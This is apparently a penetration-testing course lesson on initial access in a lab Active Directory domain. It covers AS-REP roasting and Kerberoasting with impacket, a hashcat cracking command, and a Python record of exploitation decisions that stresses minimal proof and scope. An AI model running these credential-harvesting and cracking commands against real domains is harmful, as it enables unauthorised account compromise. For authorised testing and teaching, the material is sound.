Initial Access and Exploitation

Summary

Capstone stage two: exploiting the exposure the map found. The discipline is minimal proof — prove
the path, capture it, and move on to escalation.

The framing: initial access is complete the moment you have a
working shell on an in-scope host and the evidence recorded.
Everything after that is a different authorisation question.

The order the map dictates

  THE MAP SAID, IN PRIORITY ORDER:

    1. anonymous LDAP  -> the domain can be enumerated with nothing
    2. preauth off     -> AS-REP roasting works with nothing
    3. SPNs + RC4      -> Kerberoasting needs one credential
    4. privileged acct -> the cracked password may be enough
    5. long paths      -> helpdesk, as a fallback

  THE ORDER IS NOT "WHAT'S MOST IMPRESSIVE". It is what needs the
  least privilege, earliest. Getting to (2) with no credentials at
  all is the most important result in the engagement, because it
  proves the attack is available to anyone who can reach port 88.

  AND THE REASON TO TRY THE UNAUTHENTICATED PATH FIRST: if it works,
  everything after it is corroboration rather than discovery, and
  your report says "reachable by any network-adjacent party" rather
  than "reachable by an authenticated user".

#!/usr/bin/env bash
# Stage 2. Initial access, following the recon map's priority order.
set -uo pipefail
DC="192.168.56.10"
OUT="evidence/raw"
mkdir -p "$OUT"

echo "=============================================================="
echo " INITIAL ACCESS - the least-privilege path first"
echo "=============================================================="

# ---------------------------------------------------------------
# ATTEMPT 1: no credentials at all.
# ---------------------------------------------------------------
echo
echo "=== 1. AS-REP ROASTING - REQUIRES NO CREDENTIAL ==="
echo "  This is the most important test in the engagement."
echo "  If it works, the attack is available to any host that can"
echo "  reach port 88. That is a materially worse finding than one"
echo "  that requires a valid account."
echo
if command -v GetNPUsers >/dev/null || python3 -c "import impacket" 2>/dev/null; then
  GetNPUsers -dc-ip "$DC" -request -format hash \
    -outputfile "$OUT/asrep.txt" 2>&1 | grep -vE "^\[+\]" | head -12 | sed 's/^/  /'
  echo
  n=$(wc -l < "$OUT/asrep.txt" 2>/dev/null || echo 0)
  echo "  accounts harvested with NO CREDENTIAL: $n"
  if [ "$n" -gt 0 ]; then
    echo
    echo "  *** UNAUTHENTICATED ACCESS IS AVAILABLE. ***"
    echo "  Every one of these is a Critical finding on its own."
    echo "  A host anywhere on the network can harvest these."
  fi
else
  echo "  impacket not installed: pipx install impacket-toolkit"
fi

# ---------------------------------------------------------------
# ATTEMPT 2: the map said svc-backup has SPNs and RC4.
# ---------------------------------------------------------------
echo
echo "=== 2. KERBEROASTING - needs one credential, from ATTEMPT 1 ==="
CRED="${AEGIS_CRED:-}"
if [ -n "$CRED" ]; then
  echo "  using the credential recovered in attempt 1"
  case "$DC" in 192.168.56.*|10.10.10.*) ;; *) echo "REFUSED: $DC"; exit 3 ;; esac
  GetUserSPNs -dc-ip "$DC" "$CRED" -request \
    -outputfile "$OUT/spns.txt" 2>&1 | grep -vE "^\[+\]" | head -14 | sed 's/^/  /'
  echo
  echo "  these are hashcat mode 13100 lines. The CRACK is offline:"
  echo "    hashcat -m 13100 -a 0 $OUT/spns.txt rockyou.txt -r best64.rule"
  echo "  and it is your GPU, not the client's, for the entire duration."
else
  echo "  no credential available yet (set AEGIS_CRED after attempt 1's crack)"
fi

# ---------------------------------------------------------------
# THE MINIMUM PROOF, and why it matters
# ---------------------------------------------------------------
cat <<'PROOF'

  THE STANDARD, restated for the capstone:

    MINIMUM PROOF              NOT NECESSARY
    -------------------------  --------------------------------------------
    a working session          a session as Domain Admin
    the exact request          a data dump
    proof of the effect        the data itself
    one host                   the whole estate

    THE REASON, and it is not squeamishness:
      every extra request is more state you must clean up
      every extra minute is more exposure to the client's detection
      and every extra artefact is another thing in your evidence
      package that is a copy of their data

    A capstone that dumps the database has gained nothing the
    exploitation section of the report did not already say.

  THE ONE EXCEPTION: if the objective explicitly requires
  demonstrating impact, then demonstrate it - ONCE, MINIMALLY, and
  record that you did and exactly how much.
PROOF
EOF
chmod +x 01-access.sh
./01-access.sh 2>&1 | tee 02-access.txt

The exploitation decision, and what to record

cat > 03-decision.py <<'PY'
#!/usr/bin/env python3
"""The decision procedure, applied to each candidate.

Every exploitation decision in the capstone gets written down here
BEFORE the exploit runs. Not after. Because afterwards you will
rationalise whatever you did.
"""
import sys, textwrap

CANDIDATES = [
  dict(id="A1", name="AS-REP roast of svc-legacy",
       tier="ad-04 / cry-d1", credential_required=False,
       fix_available="yes - clear the preauth flag",
       why_still_do_it="there is no fix for a credential harvest that "
                       "already happened; the harvest IS the proof",
       artefact="evidence/raw/asrep.txt",
       dc_events=["4768 or 4769 (if Kerberos auditing is on)"],
       reversible=True,
       cleanup="delete the harvested file; nothing was changed on the DC"),
  dict(id="A2", name="Kerberoast svc-backup (RC4)",
       tier="ad-04 / imp-04", credential_required=True,
       fix_available="yes - AES-only and gMSA",
       why_still_do_it="to establish that a PRIVILEGED account's password "
                       "is recoverable, which the SPN list alone does not show",
       artefact="evidence/raw/spns.txt, evidence/raw/cracked.txt",
       dc_events=["4769 x N (one per request)"],
       reversible=True,
       cleanup="offline only; nothing to clean"),
  dict(id="A3", name="AS-REP roast of svc-backup",
       tier="ad-04", credential_required=False,
       fix_available="yes - clear the preauth flag",
       why_still_do_it="to establish that the PRIVILEGED account is "
                       "harvestable with NO credentials at all. This is the "
                       "worst-case version of A2 and it needs no password.",
       artefact="evidence/raw/asrep-priv.txt",
       dc_events=["4768 or 4769"],
       reversible=True,
       cleanup="delete the file"),
  dict(id="A4", name="exploitation of an application CVE on WKS01",
       tier="ex-01..ex-06", credential_required=False,
       fix_available="unknown",
       why_still_do_it="NOT PROCEEDED. The map did not identify an exposed "
                       "service here, and inventing an exploit path is not "
                       "recon. Recorded as 'no exposed service found'.",
       artefact="none", dc_events=[], reversible=True,
       cleanup="n/a"),
]

def render():
    print("  " + "="*88)
    print("  EXPLOITATION DECISION RECORD  (written before each attempt)")
    print("  " + "="*88)
    for c in CANDIDATES:
        print(f"\n  [{c['id']}] {c['name']}    ({c['tier']})")
        print(f"    credential required : {c['credential_required']}")
        print(f"    a fix exists        : {c['fix_available']}")
        print(f"    WHY DO IT ANYWAY    :")
        for l in textwrap.wrap(c["why_still_do_it"], 72):
            print(f"      {l}")
        print(f"    evidence artefact   : {c['artefact']}")
        print(f"    DC events generated : {', '.join(c['dc_events']) or 'none'}")
        print(f"    reversible          : {c['reversible']}")
        print(f"    cleanup required    : {c['cleanup']}")
        verdict = ("PROCEED" if not c["artefact"] == "none" else "NOT PROCEEDED")
        print(f"    VERDICT             : {verdict}")
    print()
    print("  " + "-"*88)
    print("  THE POINT OF WRITING THIS BEFORE, and it is the whole discipline")
    print("  of cap-01's authorisation:")
    print()
    print("    A4 is the interesting one. There was no exposed service on WKS01,")
    print("    so there was nothing to exploit. The temptation is to find")
    print("    something - to scan harder, to try a CVE, to invent a reason")
    print("    to keep going. Recording 'no exposed service found' as a")
    print("    DECISION, with a reason, is a result. Leaving it out of the")
    print("    record and reporting only the things that worked is how a")
    print("    report becomes a highlight reel rather than an assessment.")
    print()
    print("  AND THE OTHER ONE: A1 and A3 generate almost NO events on the DC,")
    print("  because anonymous binds and unauthenticated AS-REQ requests are")
    print("  not logged by default. That is not a reason to skip them. It is")
    print("  the detection-review finding from cap-05, discovered by doing.")

if __name__ == "__main__":
    render()
PY
